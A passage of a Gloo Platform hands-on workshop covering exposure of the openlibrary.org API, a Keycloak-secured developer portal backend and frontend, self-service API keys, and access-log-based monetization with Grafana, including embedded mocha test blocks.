[<img src="https://img.youtube.com/vi/_GsECm06AgQ/maxresdefault.jpg" alt="VIDEO LINK" width="560" height="315"/>](https://youtu.be/_GsECm06AgQ "Video Link")


You can also expose external APIs.

Let's create an external service to define how to access the host [openlibrary.org](https://openlibrary.org/):

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: networking.gloo.solo.io/v2
kind: ExternalService
metadata:
  name: openlibrary
  namespace: bookinfo-frontends
  labels:
    expose: "true"
spec:
  hosts:
  - openlibrary.org
  ports:
  - name: http
    number: 80
    protocol: HTTP
  - name: https
    number: 443
    protocol: HTTPS
    clientsideTls: {}
EOF
```

Then, you need to create an `ApiSchemaDiscovery` object to tell Gloo Platform how to fetch the OpenAPI document:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: apimanagement.gloo.solo.io/v2
kind: ApiSchemaDiscovery
metadata:
  name: openlibrary
  namespace: bookinfo-frontends
spec:
  openapi:
    fetchEndpoint:
      url: "https://openlibrary.org/static/openapi.json"
  servedBy:
  - destinationSelector:
      kind: EXTERNAL_SERVICE
      port:
        number: 443
      selector:
        cluster: cluster1
        name: openlibrary
        namespace: bookinfo-frontends
EOF
```

An `APIDoc` Kubernetes object should be automatically created:

```shell
kubectl --context ${CLUSTER1} -n bookinfo-frontends get apidoc openlibrary -o yaml
```

<!--bash
cat <<'EOF' > ./test.js
const helpers = require('./tests/chai-exec');

describe("APIDoc has been created", () => {
    it('APIDoc is present', () => helpers.k8sObjectIsPresent({ context: process.env.CLUSTER1, namespace: "bookinfo-frontends", k8sType: "apidoc", k8sObj: "openlibrary" }));
});
EOF
echo "executing test dist/gloo-mesh-2-0-all-no-ilm/build/templates/steps/apps/bookinfo/dev-portal-stitching/tests/apidoc-created.test.js.liquid"
tempfile=$(mktemp)
echo "saving errors in ${tempfile}"
timeout 2m mocha ./test.js --timeout 10000 --retries=120 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
-->

Finally, you can create a new `RouteTable` to stitch together the `/search.json` path with the existing Bookinfo API:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: networking.gloo.solo.io/v2
kind: RouteTable
metadata:
  name: productpage-api-v2
  namespace: bookinfo-frontends
  labels:
    expose: "true"
    portal-users: "true"
    api: bookinfo
spec:
  portalMetadata:
    title: BookInfo REST API v2
    description: REST API for the Bookinfo application
    apiProductId: bookinfo
    apiProductDisplayName: BookInfo REST API
    apiVersion: v2
    customMetadata:
      lifecyclePhase: "General Availability"
  http:
    - matchers:
      - uri:
          prefix: /api/bookinfo/v2/search.json
      labels:
        apikeys: "true"
        ratelimited: "true"
        api: "productpage"
      forwardTo:
        pathRewrite: /search.json
        hostRewrite: openlibrary.org
        destinations:
          - kind: EXTERNAL_SERVICE 
            ref:
              name: openlibrary
              namespace: bookinfo-frontends
              cluster: cluster1
            port:
              number: 443
    - matchers:
      - uri:
          regex: /api/bookinfo/v2/authors/([^.]+).json
      labels:
        apikeys: "true"
        ratelimited: "true"
        api: "productpage"
      forwardTo:
        hostRewrite: openlibrary.org
        regexRewrite:
          pattern:
            regex: /api/bookinfo/v2/authors/([^.]+).json
          substitution: /authors/\1.json
        destinations:
          - kind: EXTERNAL_SERVICE 
            ref:
              name: openlibrary
              namespace: bookinfo-frontends
              cluster: cluster1
            port:
              number: 443
    - matchers:
      - uri:
          prefix: /api/bookinfo/v2
      labels:
        apikeys: "true"
        ratelimited: "true"
        api: "productpage"
      forwardTo:
        pathRewrite: /api/v1/products
        destinations:
          - ref:
              name: productpage
              namespace: bookinfo-frontends
            port:
              number: 9080
EOF
```

You can think about this `RouteTable` as the same API product as the one we've created previously, but this time we defined the version to be `v2`.

You can check the new path is available:

```shell
curl -k -H "api-key: ${API_KEY_USER1}" "https://cluster1-bookinfo.example.com/api/bookinfo/v2/search.json?title=The%20Comedy%20of%20Errors&fields=language&limit=1"
```

<!--bash
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("Access the openlibrary API", () => {
  it('Checking text \'language\' in the response', () => helpersHttp.checkBody({ host: `https://cluster1-bookinfo.example.com`, path: '/api/bookinfo/v2/search.json?title=The%20Comedy%20of%20Errors&fields=language&limit=1', headers: [{key: 'api-key', value: process.env.API_KEY_USER1}], body: 'language', match: true }));
})
EOF
echo "executing test dist/gloo-mesh-2-0-all-no-ilm/build/templates/steps/apps/bookinfo/dev-portal-stitching/tests/access-openlibrary-api.test.js.liquid"
tempfile=$(mktemp)
echo "saving errors in ${tempfile}"
timeout 2m mocha ./test.js --timeout 10000 --retries=120 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
-->

You should get something like that:

```json,nocopy
{
    "numFound": 202,
    "start": 0,
    "numFoundExact": true,
    "docs": [
        {
            "language": [
                "ger",
                "und",
                "eng",
                "tur",
                "ita",
                "fre",
                "tsw",
                "heb",
                "spa",
                "nor",
                "slo",
                "chi",
                "mul",
                "esp",
                "dut",
                "fin"
            ]
        }
    ],
    "num_found": 202,
    "q": "",
    "offset": null
}
```

Note we've also exposed the `/authors/{olid}.json` path to demonstrate how we can use regular expressions to capture path parameters.

You can try it out with the following command:

```shell
curl -k -H "api-key: ${API_KEY_USER1}" "https://cluster1-bookinfo.example.com/api/bookinfo/v2/authors/OL23919A.json"
```



## Lab 29 - Expose the dev portal backend <a name="lab-29---expose-the-dev-portal-backend-"></a>
[<img src="https://img.youtube.com/vi/mfXww6udYFs/maxresdefault.jpg" alt="VIDEO LINK" width="560" height="315"/>](https://youtu.be/mfXww6udYFs "Video Link")


Now that your API has been exposed securely and our plans defined, you probably want to advertise it through a developer portal.

Two components are serving this purpose:
- the Gloo Platform portal backend which provides an API
- the Gloo Platform portal frontend which consumes this API

In this lab, we're going to setup the Gloo Platform portal backend.

The Gateway team should create a parent `RouteTable` for the portal.

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: networking.gloo.solo.io/v2
kind: RouteTable
metadata:
  name: main-portal
  namespace: istio-gateways
spec:
  hosts:
    - cluster1-portal.example.com
  virtualGateways:
    - name: north-south-gw
      namespace: istio-gateways
      cluster: cluster1
  workloadSelectors: []
  http:
    - name: root
      matchers:
      - uri:
          prefix: /
      delegate:
        routeTables:
          - labels:
              expose: "true"
              portal: "true"
            workspace: gateways
        sortMethod: ROUTE_SPECIFICITY
EOF
```

After that, you can expose the portal API through Ingress Gateway using a `RouteTable`:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: networking.gloo.solo.io/v2
kind: RouteTable
metadata:
  name: portal-server
  namespace: gloo-mesh-addons
  labels:
    expose: "true"
    portal: "true"
spec:
  defaultDestination:
    ref:
      name: gloo-mesh-portal-server
      namespace: gloo-mesh-addons
      cluster: cluster1
    port:
      number: 8080
  http:
    - forwardTo:
        pathRewrite: /v1
      name: authn-api-and-usage-plans-access-token
      labels:
        oauth: "access-token"
        route: portal-api
      matchers:
        - uri:
            prefix: /portal-server/v1
          headers:
            - name: Authorization
    - forwardTo:
        pathRewrite: /v1
      name: authn-api-and-usage-plans
      labels:
        oauth: "authorization-code"
        route: portal-api
      matchers:
        - uri:
            prefix: /portal-server/v1
          headers:
            - name: Cookie
              #value: ".*?id_token=.*" # if not storing the id_token in Redis
              value: ".*?keycloak-session=.*" # if storing the id_token in Redis
              regex: true
    - name: no-auth-apis
      forwardTo:
        pathRewrite: /v1
      labels:
        route: portal-api
      matchers:
        - uri:
            prefix: /portal-server/v1
EOF
```
Make sure the domain is in our `/etc/hosts` file:

```bash
./scripts/register-domain.sh cluster1-portal.example.com ${HOST_GW_CLUSTER1}
```

You should now be able to access the portal API through the gateway without any authentication:

```shell
curl -k "https://cluster1-portal.example.com/portal-server/v1/apis"
```

<!--bash
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("Access the portal API without authentication", () => {
  it('Checking text \'portal config not found\' in the response', () => helpersHttp.checkBody({ host: `https://cluster1-portal.example.com`, path: '/portal-server/v1/apis', body: 'portal config not found', match: true }));
})
EOF
echo "executing test dist/gloo-mesh-2-0-all-no-ilm/build/templates/steps/apps/bookinfo/dev-portal-backend/tests/access-portal-api-no-auth-no-config.test.js.liquid"
tempfile=$(mktemp)
echo "saving errors in ${tempfile}"
timeout 2m mocha ./test.js --timeout 10000 --retries=120 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
-->

Here is the expected output:

```json,nocopy
{"message":"portal config not found for host: ***"}
```

You can see that no portal configuration has been found.

Let's create it !

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: apimanagement.gloo.solo.io/v2
kind: Portal
metadata:
  name: portal
  namespace: gloo-mesh-addons
spec:
  portalBackendSelectors:
    - selector:
        cluster: cluster1
        namespace: gloo-mesh-addons
  domains:
  - "*"
  usagePlans:
    - name: bronze
      displayName: "Bronze Plan"
      description: "A basic usage plan"
    - name: silver
      displayName: "Silver Plan"
      description: "A better usage plan"
    - name: gold
      displayName: "Gold Plan"
      description: "The best usage plan!"
  apis:
    - labels:
        api: bookinfo
EOF
```

Try again to access the API:

```shell
curl -k "https://cluster1-portal.example.com/portal-server/v1/apis"
```

<!--bash
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("Access the portal API without authentication", () => {
  it('Checking text \'null\' in the response', () => helpersHttp.checkBody({ host: `https://cluster1-portal.example.com`, path: '/portal-server/v1/apis', body: '[]', match: true }));
})
EOF
echo "executing test dist/gloo-mesh-2-0-all-no-ilm/build/templates/steps/apps/bookinfo/dev-portal-backend/tests/access-portal-api-no-auth-empty.test.js.liquid"
tempfile=$(mktemp)
echo "saving errors in ${tempfile}"
timeout 2m mocha ./test.js --timeout 10000 --retries=120 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
-->

The response should be an empty array: `[]`.

This is expected because you're not authenticated.

Users will authenticate on the frontends using OIDC and get access to specific APIs and plans based on the claims they'll have in the returned JWT token.

You need to create a `PortalGroup` object to define these rules:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: apimanagement.gloo.solo.io/v2
kind: PortalGroup
metadata:
  name: portal-users
  namespace: gloo-mesh-addons
spec:
  name: portal-users
  description: a group for users accessing the customers APIs
  membership:
    - claims:
        - key: group
          value: users
  accessLevel:
    apis:
    - labels:
        portal-users: "true"
    usagePlans:
    - gold
EOF
```

All the users who will have a JWT token containing the claim `group` with the value `users` will have access to the APIs containing the label `portal-users: "true"`.

The `RouteTable` we have created for the `bookinfo` API has this label.



## Lab 30 - Deploy and expose the dev portal frontend <a name="lab-30---deploy-and-expose-the-dev-portal-frontend-"></a>


The developer frontend is provided as a fully functional template to allow you to customize it based on your own requirements.



Let's deploy it:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: v1
kind: ServiceAccount
metadata:
  name: portal-frontend
  namespace: gloo-mesh-addons
---
apiVersion: v1
kind: Service
metadata:
  name: portal-frontend
  namespace: gloo-mesh-addons
  labels:
    app: portal-frontend
    service: portal-frontend
spec:
  ports:
  - name: http
    port: 4000
    targetPort: 4000
  selector:
    app: portal-frontend
---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: portal-frontend
  namespace: gloo-mesh-addons
spec:
  replicas: 1
  selector:
    matchLabels:
      app: portal-frontend
  template:
    metadata:
      labels:
        app: portal-frontend
    spec:
      serviceAccountName: portal-frontend
      containers:
      - image: djannot/portal-frontend:0.1
        args: ["--host", "0.0.0.0"]
        imagePullPolicy: Always
        name: portal-frontend
        ports:
        - containerPort: 4000
        readinessProbe:
          httpGet:
            path: /login
            port: 4000
        env:
        - name: VITE_PORTAL_SERVER_URL
          value: "https://cluster1-portal.example.com/portal-server/v1"
        - name: VITE_APPLIED_OIDC_AUTH_CODE_CONFIG
          value: "true"
        - name: VITE_OIDC_AUTH_CODE_CONFIG_CALLBACK_PATH
          value: "/v1/login"
        - name: VITE_OIDC_AUTH_CODE_CONFIG_LOGOUT_PATH
          value: "/v1/logout"
EOF
```

We can now expose the portal frontend through Ingress Gateway using a `RouteTable`:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: networking.gloo.solo.io/v2
kind: RouteTable
metadata:
  name: portal-frontend
  namespace: gloo-mesh-addons
  labels:
    expose: "true"
    portal: "true"
spec:
  http:
    - name: portal-frontend-auth
      forwardTo:
        destinations:
          - port:
              number: 4000
            ref:
              name: portal-frontend
              namespace: gloo-mesh-addons
              cluster: cluster1
      labels:
        oauth: "authorization-code"
        route: portal-api
      matchers:
        - uri:
            prefix: /v1/login
        - uri:
            prefix: /v1/logout
    - name: portal-frontend-no-auth
      matchers:
      - uri:
          prefix: /
      forwardTo:
        destinations:
          - ref:
              name: portal-frontend
              namespace: gloo-mesh-addons
              cluster: cluster1
            port:
              number: 4000
EOF
```

<!--bash
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("Access the portal frontend without authentication", () => {
  it('Checking text \'Developer Portal\' in the response', () => helpersHttp.checkBody({ host: `https://cluster1-portal.example.com`, path: '/index.html', body: 'Developer Portal', match: true }));
})
EOF
echo "executing test dist/gloo-mesh-2-0-all-no-ilm/build/templates/steps/apps/bookinfo/dev-portal-frontend/tests/access-portal-frontend-no-auth.test.js.liquid"
tempfile=$(mktemp)
echo "saving errors in ${tempfile}"
timeout 2m mocha ./test.js --timeout 10000 --retries=300 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
-->

You should now be able to access the portal frontend through the gateway.

![Dev Portal Home](images/steps/dev-portal-frontend/home.png)

If you click on the `VIEW APIS` button, you won't see any API because we haven't defined any public API.

Get the URL to access the portal frontend using the following command:
```
echo "https://cluster1-portal.example.com"
```

But we need to secure the access to the portal frontend.

First, you need to create a Kubernetes Secret that contains the OIDC secret:

```bash
kubectl --context ${CLUSTER1} apply -f - <<EOF
apiVersion: v1
kind: Secret
metadata:
  name: oauth
  namespace: gloo-mesh-addons
type: extauth.solo.io/oauth
data:
  client-secret: $(echo -n ${KEYCLOAK_SECRET} | base64)
EOF
```

Then, you need to create an `ExtAuthPolicy`: 

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: security.policy.gloo.solo.io/v2
kind: ExtAuthPolicy
metadata:
  name: portal
  namespace: gloo-mesh-addons
spec:
  applyToRoutes:
  - route:
      labels:
        oauth: "authorization-code"
  config:
    server:
      name: ext-auth-server
      namespace: gloo-mesh-addons
      cluster: cluster1
    glooAuth:
      configs:
      - oauth2:
          oidcAuthorizationCode:
            appUrl: "https://cluster1-portal.example.com"
            callbackPath: /v1/login
            clientId: ${KEYCLOAK_CLIENT}
            clientSecretRef:
              name: oauth
              namespace: gloo-mesh-addons
            issuerUrl: "${KEYCLOAK_URL}/realms/master/"
            logoutPath: /v1/logout
            session:
              failOnFetchFailure: true
              redis:
                cookieName: keycloak-session
                options:
                  host: redis:6379
            scopes:
            - email
            headers:
              idTokenHeader: id_token
EOF
```

<!--
Finally, we need to update the `RouteTable` we've created in the previous lab:

```
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: networking.gloo.solo.io/v2
kind: RouteTable
metadata:
  name: portal-server
  namespace: gloo-mesh-addons
  labels:
    expose: "true"
    portal: "true"
spec:
  defaultDestination:
    ref:
      name: gloo-mesh-portal-server
      namespace: gloo-mesh-addons
      cluster: cluster1
    port:
      number: 8080
  http:
    - name: portal-frontend-auth
      forwardTo:
        destinations:
          - port:
              number: 4000
            ref:
              name: portal-frontend
              namespace: gloo-mesh-addons
              cluster: cluster1
      labels:
        oauth: "true" # apply ext auth policy
        route: portal-api
      matchers:
        - uri:
            prefix: /portal-server/v1/login
    - forwardTo:
        pathRewrite: /v1
      name: authn-api-and-usage-plans
      labels:
        oauth: "true" # apply ext auth policy
        route: portal-api
      matchers:
        - uri:
            prefix: /portal-server/v1
          headers:
            - name: Cookie
              #value: ".*?id_token=.*" # match characters before id_token= and after id_token= zero to unlimited times
              value: ".*?keycloak-session=.*" # match characters before keycloak-session= and after keycloak-session= zero to unlimited times
              regex: true
    - forwardTo:
        pathRewrite: /v1/me
      name: authn-me
      labels:
        oauth: "true" # apply ext auth policy
        route: portal-api
      matchers:
        - uri:
            prefix: /portal-server/v1/me
    - forwardTo:
        pathRewrite: /v1/api-keys
      name: authn-api-keys
      labels:
        oauth: "true" # apply ext auth policy
        route: portal-api
      matchers:
        - uri:
            prefix: /portal-server/v1/api-keys
EOF
```
-->

<!--bash
ATTEMPTS=1
timeout 60 bash -c 'while [[ "$(curl -m 2 --max-time 2 --insecure -s -o /dev/null -w ''%{http_code}'' https://cluster1-portal.example.com/v1/login)" != "302" ]]; do sleep 5; done'
timeout 60 bash -c 'while [[ "$(curl -m 2 --max-time 2 --insecure -s -o /dev/null -w ''%{http_code}'' https://cluster1-portal.example.com)" != "200" ]]; do sleep 5; done'
export USER1_TOKEN=$(node tests/keycloak-token.js "https://cluster1-portal.example.com/v1/login" user1)
export USER2_TOKEN=$(node tests/keycloak-token.js "https://cluster1-portal.example.com/v1/login" user2)
until ([ ! -z "$USER1_TOKEN" ] && [[ $USER1_TOKEN != *"dummy"* ]]) || [ $ATTEMPTS -gt 20 ]; do
  printf "."
  ATTEMPTS=$((ATTEMPTS + 1))
  sleep 1
  export USER1_TOKEN=$(node tests/keycloak-token.js "https://cluster1-portal.example.com/v1/login" user1)
done
until ([ ! -z "$USER2_TOKEN" ] && [[ $USER2_TOKEN != *"dummy"* ]]) || [ $ATTEMPTS -gt 20 ]; do
  printf "."
  ATTEMPTS=$((ATTEMPTS + 1))
  sleep 1
  export USER2_TOKEN=$(node tests/keycloak-token.js "https://cluster1-portal.example.com/v1/login" user2)
done
echo "User1 token: $USER1_TOKEN"
echo "User2 token: $USER2_TOKEN"
-->
<!--bash
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("Authentication is working properly", function() {
  const cookieString = process.env.USER1_TOKEN;

  it("The portal frontend isn't accessible without authenticating", () => {
    return helpersHttp.checkURL({ host: `https://cluster1-portal.example.com`, path: '/v1/login', retCode: 302 });
  });

  it("The portal frontend is accessible after authenticating", () => {
    return helpersHttp.checkURL({ host: `https://cluster1-portal.example.com`, path: '/v1/login', headers: [{ key: 'Cookie', value: cookieString }], retCode: 404 });
  });
});
EOF
echo "executing test dist/gloo-mesh-2-0-all-no-ilm/build/templates/steps/apps/bookinfo/dev-portal-frontend/tests/access-portal-frontend-authenticated.test.js.liquid"
tempfile=$(mktemp)
echo "saving errors in ${tempfile}"
timeout 2m mocha ./test.js --timeout 10000 --retries=120 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
-->

Note that The `ExtAuthPolicy` is enforced on both the `portal-frontend` and `portal-server` `RouteTables`.

If you click on the `LOGIN` button on the top right corner, you'll be redirected to keycloak and should be able to auth with the user `user1` and the password `password`.

Now, if you click on the `VIEW APIS` button, you should see the `Bookinfo REST API`.

![Dev Portal APIs](images/steps/dev-portal-frontend/apis.png)

Finally, you need to create a CORS Policy to allow the portal frontend to send API calls the `bookinfo` API.

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: security.policy.gloo.solo.io/v2
kind: CORSPolicy
metadata:
  name: productpage
  namespace: bookinfo-frontends
spec:
  applyToRoutes:
  - route:
      labels:
        api: "productpage"
  config:
    allowCredentials: true
    allowHeaders:
    - "*"
    allowMethods:
    - GET
    allowOrigins:
    - regex: ".*"
EOF
```



## Lab 31 - Allow users to create their own API keys <a name="lab-31---allow-users-to-create-their-own-api-keys-"></a>
[<img src="https://img.youtube.com/vi/fipCEZqijcQ/maxresdefault.jpg" alt="VIDEO LINK" width="560" height="315"/>](https://youtu.be/fipCEZqijcQ "Video Link")


In the previous steps, we've used Kubernetes secrets to store API keys and we've created them manually.

In this steps, we're going to configure the developer portal to allow the user to create their API keys themselves and to store them on Redis (for better scalability and to support the multicluster use case).

You need to update the `ExtAuthPolicy` (to remove the `k8sSecretApikeyStorage` block): 

```bash
kubectl --context ${CLUSTER1} apply -f - <<EOF
apiVersion: security.policy.gloo.solo.io/v2
kind: ExtAuthPolicy
metadata:
  name: bookinfo-apiauth
  namespace: bookinfo-frontends
spec:
  applyToRoutes:
  - route:
      labels:
        apikeys: "true"
  config:
    server:
      name: ext-auth-server
      namespace: gloo-mesh-addons
      cluster: cluster1
    glooAuth:
      configs:
        - apiKeyAuth:
            headerName: api-key
            headersFromMetadataEntry:
              X-Solo-Plan:
                name: usagePlan
                required: true
EOF
```

Then, you can open the drop down menu by clicking on `user1` on the top right corner and select `API Keys`.

![Dev Portal API keys](images/steps/dev-portal-self-service/api-keys.png)

As you can see, you have access to the `Gold` plan and can create an API key for it. Click on the `+ADD KEY` button.

Give it a name and click on `GENERATE KEY`.

![Dev Portal API key](images/steps/dev-portal-self-service/api-key.png)

Copy the key. If you don't do that, you won't be able to see it again. You'll need to create a new one.

You can now use the key to try out the API.

You'll need to use the `Swagger View` and then to click on the `Authorize` button to paste your API key.

Before we continue, let's update the API_KEY_USER1 variable with its current value:
<!--bash
ATTEMPTS=1
while [[ $API_KEY_USER1 != *"apiKey"* ]] && [ $ATTEMPTS -lt 25 ]; do
  echo "Waiting for API key to be created ($ATTEMPTS/25)..."
  ATTEMPTS=$((ATTEMPTS + 1))
  sleep 5
  export API_KEY_USER1=$(curl -k -s -X POST -H 'Content-Type: application/json' -d '{"usagePlan": "gold", "apiKeyName": "key1"}' -H "Cookie: ${USER1_TOKEN}" "https://cluster1-portal.example.com/portal-server/v1/api-keys")
  echo API key: $API_KEY_USER1
done
-->
```bash
export API_KEY_USER1=$(curl -k -s -X POST -H 'Content-Type: application/json' -d '{"usagePlan": "gold", "apiKeyName": "key1"}' -H "Cookie: ${USER1_TOKEN}" "https://cluster1-portal.example.com/portal-server/v1/api-keys"  | jq -r '.apiKey')
echo API key: $API_KEY_USER1
```

<!--bash
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("API key creation working properly", function() {
  it("Authentication is working with the generated API key", () => helpersHttp.checkURL({ host: `https://cluster1-bookinfo.example.com`, path: '/api/bookinfo/v1', headers: [{key: 'api-key', value: process.env.API_KEY_USER1}], retCode: 200 }));
});
EOF
echo "executing test dist/gloo-mesh-2-0-all-no-ilm/build/templates/steps/apps/bookinfo/dev-portal-self-service/tests/api-key.test.js.liquid"
tempfile=$(mktemp)
echo "saving errors in ${tempfile}"
timeout 2m mocha ./test.js --timeout 10000 --retries=150 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
-->



## Lab 32 - Dev portal monetization <a name="lab-32---dev-portal-monetization-"></a>
[<img src="https://img.youtube.com/vi/VTvQ7YQi2eA/maxresdefault.jpg" alt="VIDEO LINK" width="560" height="315"/>](https://youtu.be/VTvQ7YQi2eA "Video Link")


The recommended way to monetize your API is to leverage the usage plans we've defined in the previous labs.

In that case, you don't need to measure how many calls are sent by each user.

But if you requires fine grained monetization, we can deliver this as well.

The `portalMetadata` section of the `RouteTable` we've created previously is used to add some metadata in the access logs.

You can configure the access logs to take advantage of the metadata:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: networking.istio.io/v1alpha3
kind: EnvoyFilter
metadata:
  name: ingressgateway-access-logging
  namespace: istio-system
spec:
  workloadSelector:
    labels:
      istio: ingressgateway
  configPatches:
  - applyTo: NETWORK_FILTER
    match:
      context: GATEWAY
      listener:
        filterChain:
          filter:
            name: "envoy.filters.network.http_connection_manager"
    patch:
      operation: MERGE
      value:
        typed_config:
          "@type": "type.googleapis.com/envoy.extensions.filters.network.http_connection_manager.v3.HttpConnectionManager"
          access_log:
          - name: envoy.access_loggers.file
            typed_config:
              "@type": "type.googleapis.com/envoy.extensions.access_loggers.file.v3.FileAccessLog"
              path: /dev/stdout
              log_format:
                json_format:
                  "timestamp": "%START_TIME%"
                  "server_name": "%REQ(:AUTHORITY)%"
                  "response_duration": "%DURATION%"
                  "request_command": "%REQ(:METHOD)%"
                  "request_uri": "%REQ(X-ENVOY-ORIGINAL-PATH?:PATH)%"
                  "request_protocol": "%PROTOCOL%"
                  "status_code": "%RESPONSE_CODE%"
                  "client_address": "%DOWNSTREAM_REMOTE_ADDRESS_WITHOUT_PORT%"
                  "x_forwarded_for": "%REQ(X-FORWARDED-FOR)%"
                  "bytes_sent": "%BYTES_SENT%"
                  "bytes_received": "%BYTES_RECEIVED%"
                  "user_agent": "%REQ(USER-AGENT)%"
                  "downstream_local_address": "%DOWNSTREAM_LOCAL_ADDRESS%"
                  "requested_server_name": "%REQUESTED_SERVER_NAME%"
                  "request_id": "%REQ(X-REQUEST-ID)%"
                  "response_flags": "%RESPONSE_FLAGS%"
                  "route_name": "%ROUTE_NAME%"
                  "upstream_cluster": "%UPSTREAM_CLUSTER%"
                  "upstream_host": "%UPSTREAM_HOST%"
                  "upstream_local_address": "%UPSTREAM_LOCAL_ADDRESS%"
                  "upstream_service_time": "%REQ(x-envoy-upstream-service-time)%"
                  "upstream_transport_failure_reason": "%UPSTREAM_TRANSPORT_FAILURE_REASON%"
                  "correlation_id": "%REQ(X-CORRELATION-ID)%"
                  "user_id": "%DYNAMIC_METADATA(envoy.filters.http.ext_authz:userId)%"
                  "api_id": "%DYNAMIC_METADATA(io.solo.gloo.apimanagement:api_id)%"
                  "api_product_id": "%DYNAMIC_METADATA(io.solo.gloo.apimanagement:api_product_id)%"
                  "api_product_name": "%DYNAMIC_METADATA(io.solo.gloo.apimanagement:api_product_name)%"
                  "usage_plan": "%DYNAMIC_METADATA(envoy.filters.http.ext_authz:usagePlan)%"
                  "custom_metadata": "%DYNAMIC_METADATA(io.solo.gloo.apimanagement:custom_metadata)%"
EOF
```

Note that you can also configure the access logs when deploying Istio with the `IstioLifecycleManager` object.

After that, you can send an API call:

```bash
curl -k -H "api-key: ${API_KEY_USER1}" "https://cluster1-bookinfo.example.com/api/bookinfo/v1"
```

Now, let's check the logs of the Istio Ingress Gateway:

```shell
kubectl --context ${CLUSTER1} -n istio-gateways logs -l istio=ingressgateway --tail 1 | jq .
```

You should get an output similar to this:

```json,nocopy
{
  "timestamp": "2023-08-03T07:39:25.540Z",
  "user_agent": "curl/7.81.0",
  "downstream_local_address": "10.101.0.16:8443",
  "requested_server_name": null,
  "route_name": "unnamed-0-productpage-api-v1.bookinfo-frontends.cluster1--main.istio-gateways.cluster1",
  "request_protocol": "HTTP/2",
  "status_code": 200,
  "upstream_local_address": "10.101.0.16:58536",
  "request_command": "GET",
  "client_address": "10.101.0.1",
  "response_duration": 5,
  "upstream_cluster": "outbound|9080||productpage.bookinfo-frontends.svc.cluster.local",
  "correlation_id": null,
  "usage_plan": "gold",
  "request_uri": "/api/bookinfo/v1",
  "server_name": "172.18.101.4",
  "api_product_id": "bookinfo",
  "api_product_name": "BookInfo REST API",
  "custom_metadata": "{\"lifecyclePhase\":\"General Availability\"}",
  "bytes_received": 0,
  "response_flags": "-",
  "api_id": "bookinfo-v1",
  "x_forwarded_for": "10.101.0.1",
  "user_id": "user1@example.com",
  "upstream_service_time": null,
  "upstream_host": "10.101.0.34:9080",
  "bytes_sent": 395,
  "request_id": "5f055530-52f2-46e4-bca2-2be27cb65e95",
  "upstream_transport_failure_reason": null
}
```

You can see several key information you can use for monetization purpose:
- the API name
- the usage plan
- they user identity
- the customer metadata
- and everything about the request (method, path, status)

You can gather and process these access logs on your own, but Gloo Platform can also collect them through its open telemetry pipeline and store them in a [ClickHouse](https://clickhouse.com/) database.

This has already been configured when we deployed the different Gloo Platform components.

To visualize the information we've ingested, we need to deploy Grafana.

```bash
kubectl --context ${MGMT} -n gloo-mesh create cm portal-api-analytics \
--from-file=data/steps/dev-portal-monetization/portal-api-analytics.json

kubectl apply --context ${MGMT} -f- <<EOF
apiVersion: v1
kind: Secret
metadata:
  name: grafana
  namespace: gloo-mesh
stringData:
  admin-user: admin
  admin-password: password
type: Opaque
EOF

helm repo add grafana https://grafana.github.io/helm-charts
helm repo update
helm upgrade --install grafana \
grafana/grafana \
--kube-context ${MGMT} \
--version 6.58.7 \
--namespace gloo-mesh \
--create-namespace \
--values - <<EOF
admin:
  existingSecret: grafana
service:
  port: 3000
  type: LoadBalancer
plugins:
- grafana-clickhouse-datasource
datasources:
  datasources.yaml:
    apiVersion: 1
    datasources:
    - name: ClickHouse
      type: grafana-clickhouse-datasource
      isDefault: false
      uid: clickhouse-access-logs
      jsonData:
        defaultDatabase: default
        port: 9000
        server: clickhouse.gloo-mesh
        username: default
        tlsSkipVerify: true
      secureJsonData:
        password: password
dashboardProviders:
  dashboardproviders.yaml:
    apiVersion: 1
    providers:
      - name: "clickhouse"
        orgId: 1
        folder: "clickhouse"
        type: file
        disableDeletion: false
        options:
          path: /var/lib/grafana/dashboards/clickhouse
dashboardsConfigMaps:
  clickhouse: portal-api-analytics
defaultDashboardsEnabled: false
grafana.ini:
  auth.anonymous:
    enabled: true
EOF
kubectl --context ${MGMT} -n gloo-mesh rollout status deployment grafana
```

Get the URL to access Grafana the following command:
```
echo "http://$(kubectl --context ${MGMT} -n gloo-mesh get svc grafana -o jsonpath='{.status.loadBalancer.ingress[*].ip}')"
```

Login with the user `admin` and the password `password`.

Open the `API dashboard`.

![Grafana](images/steps/dev-portal-monetization/grafana.png)

<!--bash
cat <<'EOF' > ./test.js
var chai = require('chai');
var expect = chai.expect;
const helpers = require('./tests/chai-exec');

describe("Monetization is working", () => {
  it('Response contains all the required monetization fields', () => {
    const response = helpers.getOutputForCommand({ command: `curl -k -H \"api-key: ${process.env.API_KEY_USER1}\" https://cluster1-bookinfo.example.com/api/bookinfo/v1` });
    const output = JSON.parse(helpers.getOutputForCommand({ command: `kubectl --context ${process.env.CLUSTER1} -n istio-gateways logs -l istio=ingressgateway --tail 1` }));
